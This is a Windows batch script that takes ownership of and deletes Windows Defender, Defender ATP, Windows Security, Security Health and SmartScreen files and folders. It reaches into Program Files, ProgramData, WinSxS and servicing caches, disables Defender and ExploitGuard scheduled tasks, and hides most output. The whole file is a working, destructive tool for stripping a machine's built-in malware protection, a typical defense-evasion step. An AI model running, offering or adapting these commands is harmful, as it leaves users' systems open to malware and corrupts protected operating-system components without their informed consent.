@echo off
takeown /F "C:\Program Files\Windows Defender" /R /A >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files\Windows Defender" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /R /A >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /R /A >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Program Files (x86)\Windows Defender" /R /A >nul 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files (x86)\Windows Defender" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Program Files\Windows Defender\MpOAV.dll" /R /A >nul 2>&1
icacls "C:\Program Files\Windows Defender\MpOAV.dll" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files\Windows Defender\MpOAV.dll" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files\Windows Defender\MpOAV.dll" >nul 2>&1
del /F /Q "C:\Program Files\Windows Defender\MpOAV.dll" >nul 2>&1
timeout /t 3
takeown /F "C:\Windows\System32\SecurityHealthService.exe" /A
ren "C:\Windows\System32\SecurityHealthService.exe" SecurityHealthService.dat
del "C:\Windows\System32\SecurityHealthService.dat"
takeown /F "C:\Windows\System32\smartscreen.exe" /A
icacls "C:\Windows\System32\smartscreen.exe" /grant Administrators:F /T
icacls "C:\Windows\System32\smartscreen.exe" /grant %USERNAME%:(F) /T
ren "C:\Windows\System32\smartscreen.exe" smartscreen.dat
del "C:\Windows\System32\smartscreen.dat"
takeown /F "C:\Windows\System32\SecurityHealthSystray.exe" /A
ren "C:\Windows\System32\SecurityHealthSystray.exe" SecurityHealthSystray.dat
del "C:\Windows\System32\SecurityHealthSystray.dat"
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
timeout /t 3
takeown /F "C:\Program Files (x86)\Windows Defender" /R /A
icacls "C:\Program Files (x86)\Windows Defender" /grant Administrators:F /T
icacls "C:\Program Files (x86)\Windows Defender" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\Program Files (x86)\Windows Defender"
timeout /t 3
echo S | takeown /F "C:\Program Files\Windows Defender Advanced Threat Protection" /R /A
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant Administrators:F /T
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\Program Files\Windows Defender Advanced Threat Protection"
timeout /t 3
takeown /F "C:\Program Files\Windows Defender" /R /A
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /T
icacls "C:\Program Files\Windows Defender" /grant %USERNAME%:(F) /T
timeout /t 3
takeown /F "C:\Program Files\Windows Security" /R /A
icacls "C:\Program Files\Windows Security" /grant Administrators:F /T
icacls "C:\Program Files\Windows Security" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\Program Files\Windows Security"
timeout /t 3
takeown /F "C:\ProgramData\Microsoft\Windows Defender" /R /A
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant Administrators:F /T
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\ProgramData\Microsoft\Windows Defender"
timeout /t 3
echo S | takeown /F "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" /R /A
icacls "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" /grant Administrators:F /T
icacls "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection"
timeout /t 3
takeown /F "C:\Program Files\Windows Defender\shellext.dat" /A
ren "C:\Program Files\Windows Defender\shellext.dll" shellext.dat
del "C:\Program Files\Windows Defender\shellext.dat"
timeout /t 3
takeown /F "C:\ProgramData\Microsoft\Windows Security Health" /R /A
icacls "C:\ProgramData\Microsoft\Windows Security Health" /grant Administrators:F /T
icacls "C:\ProgramData\Microsoft\Windows Security Health" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\ProgramData\Microsoft\Windows Security Health"
timeout /t 3
takeown /F "C:\Program Files\Windows Defender" /A
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /T
icacls "C:\Program Files\Windows Defender" /grant %USERNAME%:(F) /T
rmdir /S /Q "C:\Program Files\Windows Defender"
ren "C:\Program Files\Windows Defender\MpClient.dll" MpClient.dat
takeown /F "C:\Program Files\Windows Defender\MpClient.dat" /A
takeown /F "C:\Program Files\Windows Defender\shellext.dat" /A
takeown /F "C:\Program Files\Windows Defender\es-ES" /R /A
takeown /F "C:\Program Files\Windows Defender\es-ES" /A
ren "C:\Program Files\Windows Defender\ProtectionManagement.dll" ProtectionManagement.dat
del "C:\Program Files\Windows Defender\ProtectionManagement.dat"
del "C:\Program Files\Windows Defender\shellext.dat"
del "C:\Program Files\Windows Defender\MpClient.dat"
del "C:\Program Files\Windows Defender\ProtectionManagement.dat"
timeout /t 3
takeown /F "C:\Program Files\Windows Defender" /R /A
echo S | del "C:\Program Files\Windows Defender"
rmdir /S /Q "C:\Program Files\Windows Defender"
takeown /F "C:\Program Files\Windows Defender" /R /A
echo S | del "C:\Program Files\Windows Defender"
rmdir /S /Q "C:\Program Files\Windows Defender"
timeout /t 3
takeown /F "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" /R /A >nul 2>&1
icacls "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" >nul 2>&1
timeout /t 3 >nul 2>&1
takeown /F "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" /R /A >nul 2>&1
icacls "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\f" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\r" /R /A >nul 2>&1
icacls "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\r" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\r" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.4291.1.10\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828\r" >nul 2>&1

timeout /t 3 >nul 2>&1

takeown /F "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /R /A >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.746_none_a39f6d9ab59bd8b7" >nul 2>&1

timeout /t 3 >nul 2>&1

takeown /F "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828" /R /A >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828" /grant Administrators:F /T >nul 2>&1
icacls "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Windows\WinSxS\amd64_windows-defender-service_31bf3856ad364e35_10.0.19041.3636_none_3a3db9920c210828" >nul 2>&1

timeout /t 3 >nul 2>&1

takeown /F "C:\Program Files\Windows Defender" /R /A >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files\Windows Defender" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Program Files (x86)\Windows Defender" /R /A >nul 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files (x86)\Windows Defender" >nul 2>&1
timeout /t 3 >nul 2>&1

takeown /F "C:\Program Files\Windows Defender" /R /A >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files\Windows Defender" >nul 2>&1

takeown /F "C:\ProgramData\Microsoft\Windows Defender" /R /A >nul 2>&1
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\ProgramData\Microsoft\Windows Defender" >nul 2>&1

takeown /F "C:\Program Files (x86)\Windows Defender" /R /A >nul 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files (x86)\Windows Defender" >nul 2>&1

echo S | takeown /F "C:\Program Files\Windows Defender Advanced Threat Protection" /R /A >nul 2>&1
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant Administrators:F /T >nul 2>&1
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\Program Files\Windows Defender Advanced Threat Protection" >nul 2>&1

takeown /F "C:\ProgramData\Microsoft\Windows Security Health" /R /A >nul 2>&1
icacls "C:\ProgramData\Microsoft\Windows Security Health" /grant Administrators:F /T >nul 2>&1
icacls "C:\ProgramData\Microsoft\Windows Security Health" /grant %USERNAME%:(F) /T >nul 2>&1
rmdir /S /Q "C:\ProgramData\Microsoft\Windows Security Health" >nul 2>&1


takeown /F "C:\Program Files\Windows Defender" >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant Administrators:F %USERNAME%:F >nul 2>&1
del /F /Q "C:\Program Files\Windows Defender" >nul 2>&1
rmdir /S /Q "C:\Program Files\Windows Defender"












